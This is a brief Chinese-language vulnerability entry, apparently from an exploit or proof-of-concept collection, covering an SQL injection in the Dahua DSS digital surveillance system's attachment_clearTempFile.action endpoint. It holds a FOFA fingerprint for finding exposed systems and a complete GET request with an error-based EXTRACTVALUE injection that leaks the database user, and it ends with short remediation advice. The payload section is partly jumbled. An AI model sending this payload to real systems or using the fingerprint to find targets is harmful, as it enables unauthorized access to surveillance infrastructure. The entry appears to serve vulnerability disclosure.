# 大华DSS数字监控系统attachment-clearTempFile.actionSQL注入

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="dahua-DSS"`
- **请求**：`GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="dahua-DSS"
1. 部分界面如下
1. 隐患url,复现如下
Host: your-ip
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。